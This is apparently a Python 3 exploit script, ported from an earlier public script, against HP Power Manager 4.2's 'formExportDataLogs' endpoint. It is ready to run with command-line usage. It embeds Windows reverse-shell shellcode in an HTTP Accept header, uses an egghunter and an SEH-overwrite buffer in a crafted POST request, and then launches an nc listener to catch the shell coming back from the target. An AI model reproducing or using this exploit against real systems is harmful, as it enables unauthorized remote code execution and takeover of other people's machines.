#!/usr/bin/python
# This is a python3 port / extension of the HP Power Manager 'formExportDataLogs' Buffer Overflow Script by Muhammad Haidari
# For the original script visit: https://github.com/Muhammd/HP-Power-Manager
# 
# Usage: python3 hp_pm_exploit_p3.py <Remote IP Address> <Remote Port> <Local Listener Port>
# <Remote IP Address>: ip address the HP Power Manager is running on
# <Remote Port>: port the application is running on
# <Local Listener Port>: local port your shellcode is connecting back to -> script starts nc listener to catch reverse shell
#
# Swap out the shellcode
# Tested on HP Power Manager 4.2 (Build 7) on Windows 7 Ultimate (6.1.7600 N/A Build 7600)
# Author: CountablyInfinite

from urllib import parse
from time import sleep
from sys import argv,exit
from socket import socket,AF_INET,SOCK_STREAM
from os import system

try:
   HOST  = argv[1]
   PORT = int(argv[2]) # port the remote application is running on
   LPORT = int(argv[3]) # port the shellcode is connecting back to -> listener gets sta
   if (len(argv)>4):
      raise IndexError
except IndexError: 
   print("Usage: python3 %s <Remote IP Address> <Remote Port> <Local Listener Port>" % argv[0])
   print("Example: python3 %s 10.10.0.1 80 4411" % argv[0])
   exit()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
egg = "b33fb33f"
buf = egg
buf += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += "\x81\x76\x0e\xd2\x99\x85\xbb\x83\xee\xfc\xe2\xf4"
buf += "\x2e\x71\x07\xbb\xd2\x99\xe5\x32\x37\xa8\x45\xdf"
buf += "\x59\xc9\xb5\x30\x80\x95\x0e\xe9\xc6\x12\xf7\x93"
buf += "\xdd\x2e\xcf\x9d\xe3\x66\x29\x87\xb3\xe5\x87\x97"
buf += "\xf2\x58\x4a\xb6\xd3\x5e\x67\x49\x80\xce\x0e\xe9"
buf += "\xc2\x12\xcf\x87\x59\xd5\x94\xc3\x31\xd1\x84\x6a"
buf += "\x83\x12\xdc\x9b\xd3\x4a\x0e\xf2\xca\x7a\xbf\xf2"
buf += "\x59\xad\x0e\xba\x04\xa8\x7a\x17\x13\x56\x88\xba"
buf += "\x15\xa1\x65\xce\x24\x9a\xf8\x43\xe9\xe4\xa1\xce"
buf += "\x36\xc1\x0e\xe3\xf6\x98\x56\xdd\x59\x95\xce\x30"
buf += "\x8a\x85\x84\x68\x59\x9d\x0e\xba\x02\x10\xc1\x9f"
buf += "\xf6\xc2\xde\xda\x8b\xc3\xd4\x44\x32\xc6\xda\xe1"
buf += "\x59\x8b\x6e\x36\x8f\xf1\xb6\x89\xd2\x99\xed\xcc"
buf += "\xa1\xab\xda\xef\xba\xd5\xf2\x9d\xd5\x66\x50\x03"
buf += "\x42\x98\x85\xbb\xfb\x5d\xd1\xeb\xba\xb0\x05\xd0"
buf += "\xd2\x66\x50\xeb\x82\xc9\xd5\xfb\x82\xd9\xd5\xd3"
buf += "\x38\x96\x5a\x5b\x2d\x4c\x12\xd1\xd7\xf1\x45\x13"
buf += "\xff\x33\xed\xb9\xd2\x98\x3e\x32\x34\xf3\x95\xed"
buf += "\x85\xf1\x1c\x1e\xa6\xf8\x7a\x6e\x57\x59\xf1\xb7"
buf += "\x2d\xd7\x8d\xce\x3e\xf1\x75\x0e\x70\xcf\x7a\x6e"
buf += "\xba\xfa\xe8\xdf\xd2\x10\x66\xec\x85\xce\xb4\x4d"
buf += "\xb8\x8b\xdc\xed\x30\x64\xe3\x7c\x96\xbd\xb9\xba"
buf += "\xd3\x14\xc1\x9f\xc2\x5f\x85\xff\x86\xc9\xd3\xed"
buf += "\x84\xdf\xd3\xf5\x84\xcf\xd6\xed\xba\xe0\x49\x84"
buf += "\x54\x66\x50\x32\x32\xd7\xd3\xfd\x2d\xa9\xed\xb3"
buf += "\x55\x84\xe5\x44\x07\x22\x65\xa6\xf8\x93\xed\x1d"
buf += "\x47\x24\x18\x44\x07\xa5\x83\xc7\xd8\x19\x7e\x5b"
buf += "\xa7\x9c\x3e\xfc\xc1\xeb\xea\xd1\xd2\xca\x7a\x6e"

#egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
hunter =  b""
hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += b"\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = b"\x41" * (721 -len(hunter))
buffer += b"\x90"*30 + hunter
buffer += b"\xeb\xc2\x90\x90"            #JMP SHORT 0xC2 
buffer += b"\xd5\x74\x41" 	              #pop esi # pop ebx # ret 10 (DevManBE.exe)

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print("[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit")
print("[+] Sending exploit to Ip " +str(HOST)+" on port "+str(PORT)+". Starting local listener on port "+str(LPORT))
s.send(payload.encode('latin1'))
system("nc -nlvp "+ str(LPORT))
s.close()